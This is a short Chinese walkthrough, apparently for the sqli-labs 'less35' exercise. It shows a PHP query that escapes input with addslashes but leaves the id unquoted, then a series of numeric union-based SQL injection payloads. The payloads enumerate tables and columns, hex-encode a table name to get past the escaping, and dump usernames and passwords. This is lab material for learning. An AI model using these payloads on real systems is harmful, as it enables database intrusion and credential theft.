---
title: less35
url: https://www.yuque.com/u29002979/ep2zrx/xhk8kn8yghrwc522
---

```bash
function check_addslashes($string)
{
    $string = addslashes($string);
    return $string;
}

mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

**get,数字型注入**。

`?id=1 and 1=1--+`返回正常
`?id=1 and 1=2--+`没有报错回显

`?id=1 order by 4--+`没有第4列
`?id=1 order by 3--+`返回正常
3个字段

数字型注入唯一需要注意的是
在查询字段时，**数据表名使用十六进制**即可，其他地方没有转义 。 <a name="RN6n1"></a>

# 数字型注入

```bash
爆破数据库名称 
?id=-1 union select 1,2,database()--+

爆破数据库表名称
?id=-1 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+

爆破字段名称
爆破字段的时候需要将数据表的名字进行十六进制编码，防止转义  
users的16进制是0x7573657273

?id=-1 union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+

爆破字段内容
?id=-1 union select 1,2,(select group_concat(username,0x7e,password) from users)--+
```
